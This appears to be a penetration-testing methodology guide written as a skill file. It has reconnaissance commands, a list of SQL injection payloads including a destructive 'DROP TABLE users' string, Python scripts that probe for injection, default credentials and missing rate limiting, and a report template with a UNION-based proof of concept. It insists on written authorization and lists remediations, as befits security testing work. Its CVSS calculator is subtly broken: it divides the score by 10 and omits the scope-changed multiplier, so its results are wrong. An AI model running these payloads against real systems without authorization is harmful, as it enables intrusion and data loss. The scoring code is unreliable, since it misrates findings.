---
name: Penetration Testing Methodology
description: Systematic methodology for web application, network, and API penetration testing
version: "1.0.0"
author: ROOT
tags: [security, penetration-testing, red-team, OWASP, web-app-security, API-security]
platforms: [all]
difficulty: advanced
---

# Penetration Testing Methodology

Structured approach to finding security vulnerabilities before attackers do.
Always operate within authorized scope — get written permission before any testing.

## Pre-Engagement

```
1. Rules of Engagement (RoE): Define scope, timing, testing methods
2. Scope definition: IP ranges, domains, applications — what is IN and OUT of scope
3. Emergency contacts: Who to call if something breaks
4. Test environment preferences: Production or staging?
5. Legal authorization: Written permission required — no exceptions
```

## Phase 1: Reconnaissance

### Passive Recon (No Target Contact)

```bash
# DNS enumeration
dig +noall +answer @8.8.8.8 target.com ANY
subfinder -d target.com -o subdomains.txt
amass enum -passive -d target.com -o amass_results.txt

# Certificate transparency (find subdomains)
curl "https://crt.sh/?q=%25.target.com&output=json" | jq '.[].name_value'

# ASN and IP range discovery
whois -h whois.radb.net -- '-i origin AS12345'

# Email harvesting for phishing simulation
theHarvester -d target.com -b google,linkedin,shodan

# Shodan for exposed services
shodan search "org:'Target Company'" --fields ip_str,port,product
```

### Active Recon (Limited Target Contact)

```bash
# Port scanning (stealth scan)
nmap -sS -O -sV -p- --min-rate 1000 target.com -oA initial_scan

# Service version detection
nmap -sC -sV -p 80,443,8080,8443,22,25,587,993,3306,5432 target.com

# Web technology fingerprinting
whatweb -v target.com
wappalyzer --url https://target.com

# Directory brute force
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,json -t 50

# DNS zone transfer attempt
dig axfr target.com @ns1.target.com
```

## Phase 2: Vulnerability Assessment

### Web Application Testing (OWASP Top 10)

```python
# Automated scanning baseline
def run_web_vuln_scan(target_url: str) -> dict:
    """Run automated web vulnerability assessment."""
    results = {}

    # OWASP ZAP passive + active scan
    zap = ZAPv2(apikey=ZAP_API_KEY, proxies={"http": "http://localhost:8080"})
    zap.urlopen(target_url)
    scan_id = zap.ascan.scan(target_url)

    while int(zap.ascan.status(scan_id)) < 100:
        time.sleep(5)

    results["zap_alerts"] = [
        {
            "name": alert["name"],
            "risk": alert["risk"],
            "confidence": alert["confidence"],
            "url": alert["url"],
            "solution": alert["solution"]
        }
        for alert in zap.core.alerts(baseurl=target_url)
    ]
    return results
```

### SQL Injection Testing

```python
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT null, username, password FROM users --",
    "1'; WAITFOR DELAY '0:0:5' --",  # Time-based blind
    "1' AND SLEEP(5) --",            # MySQL time-based blind
    "' AND 1=2 UNION SELECT null, @@version --",  # Version detection
]

def test_sql_injection(url: str, parameter: str) -> list:
    """Test a parameter for SQL injection vulnerability."""
    findings = []

    for payload in SQL_INJECTION_PAYLOADS:
        start = time.time()
        try:
            response = requests.get(
                url,
                params={parameter: payload},
                timeout=10,
                allow_redirects=False
            )
            elapsed = time.time() - start

            # Time-based blind SQLi detection
            if "SLEEP" in payload or "WAITFOR" in payload:
                if elapsed > 4.0:
                    findings.append({
                        "type": "time_based_blind_sqli",
                        "payload": payload,
                        "delay_seconds": elapsed,
                        "confidence": "high"
                    })

            # Error-based detection
            error_patterns = ["SQL syntax", "mysql_", "ORA-", "DB2 SQL", "Microsoft OLE DB",
                            "ODBC SQL", "Unclosed quotation", "near \\'"]
            for pattern in error_patterns:
                if pattern.lower() in response.text.lower():
                    findings.append({
                        "type": "error_based_sqli",
                        "payload": payload,
                        "error_pattern": pattern,
                        "confidence": "high"
                    })

        except requests.exceptions.Timeout:
            if "SLEEP" in payload or "WAITFOR" in payload:
                findings.append({
                    "type": "time_based_blind_sqli",
                    "payload": payload,
                    "confidence": "medium"
                })

    return findings
```

### Authentication Testing

```python
def test_authentication_weaknesses(login_url: str, params: dict) -> list:
    """Test for common authentication vulnerabilities."""
    findings = []

    # 1. Default credentials
    DEFAULT_CREDS = [("admin", "admin"), ("admin", "password"), ("admin", ""),
                    ("root", "root"), ("admin", "admin123")]
    for username, password in DEFAULT_CREDS:
        resp = requests.post(login_url, data={**params, "username": username, "password": password})
        if "logout" in resp.text.lower() or resp.status_code in [302, 200]:
            if "invalid" not in resp.text.lower() and "incorrect" not in resp.text.lower():
                findings.append({"type": "default_credentials", "username": username,
                                 "password": password, "severity": "critical"})

    # 2. No rate limiting
    session = requests.Session()
    failed_attempts = 0
    for i in range(20):
        resp = session.post(login_url, data={**params, "username": "test",
                                            "password": f"wrongpass_{i}"})
        if resp.status_code != 429:
            failed_attempts += 1

    if failed_attempts >= 15:
        findings.append({
            "type": "no_rate_limiting",
            "attempts": failed_attempts,
            "severity": "high",
            "impact": "Brute force attacks possible"
        })

    # 3. Account enumeration (timing difference for valid vs invalid usernames)
    valid_time = test_login_timing(login_url, "admin@company.com", "wrongpass")
    invalid_time = test_login_timing(login_url, "notauser@xyz.com", "wrongpass")
    if abs(valid_time - invalid_time) > 0.1:  # 100ms timing difference
        findings.append({
            "type": "username_enumeration",
            "timing_difference_ms": abs(valid_time - invalid_time) * 1000,
            "severity": "medium"
        })

    return findings
```

## Phase 3: Exploitation

### CVSS Scoring for Findings

```python
def calculate_cvss_v3(attack_vector: str, attack_complexity: str,
                       privileges_required: str, user_interaction: str,
                       scope: str, confidentiality: str, integrity: str,
                       availability: str) -> dict:
    """Calculate CVSS v3.1 base score."""
    AV = {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.2}[attack_vector]
    AC = {"L": 0.77, "H": 0.44}[attack_complexity]
    PR_scope_unchanged = {"N": 0.85, "L": 0.62, "H": 0.27}
    PR_scope_changed = {"N": 0.85, "L": 0.68, "H": 0.50}
    PR = (PR_scope_changed if scope == "C" else PR_scope_unchanged)[privileges_required]
    UI = {"N": 0.85, "R": 0.62}[user_interaction]
    ISC = {"N": 0.0, "L": 0.22, "H": 0.56}
    ISCconf = ISC[confidentiality]
    ISCinteg = ISC[integrity]
    ISCavail = ISC[availability]

    ISCBase = 1 - (1 - ISCconf) * (1 - ISCinteg) * (1 - ISCavail)
    if scope == "U":
        ISS = 6.42 * ISCBase
    else:
        ISS = 7.52 * (ISCBase - 0.029) - 3.25 * (ISCBase - 0.02) ** 15

    exploitability = 8.22 * AV * AC * PR * UI
    base_score = min(10, round((ISS + exploitability) / 10, 1)) if ISS > 0 else 0

    if base_score == 0:
        rating = "None"
    elif base_score < 4.0:
        rating = "Low"
    elif base_score < 7.0:
        rating = "Medium"
    elif base_score < 9.0:
        rating = "High"
    else:
        rating = "Critical"

    return {"cvss_score": base_score, "severity_rating": rating}
```

## Phase 4: Reporting

### Finding Documentation Template

```markdown
## Finding: SQL Injection in User Search Parameter

**Severity**: Critical (CVSS 9.8)
**Location**: `GET /api/users/search?q=[PAYLOAD]`
**Evidence**: [Screenshot of SQL error / data disclosure]

### Description
The `q` parameter on the user search endpoint is vulnerable to SQL injection.
An unauthenticated attacker can manipulate database queries to extract sensitive data
or modify database records.

### Proof of Concept
```
GET /api/users/search?q=' UNION SELECT null, username, password_hash FROM users --
HTTP/1.1 200 OK

{
  "users": [
    {"id": null, "name": "admin", "email": "5f4dcc3b5aa765d61d8327de..."}
  ]
}
```

### Impact
An attacker can:
1. Extract all user credentials from the database
2. Access sensitive customer data (PII, payment info)
3. Modify or delete database records
4. In some configurations, achieve remote code execution

### Remediation
1. Use parameterized queries / prepared statements:
   ```python
   cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))
   ```
2. Input validation: reject strings with SQL metacharacters
3. Apply principle of least privilege to database account (no DROP/CREATE)
4. Enable WAF SQL injection protection as defense-in-depth

### References
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: SQL Injection
```
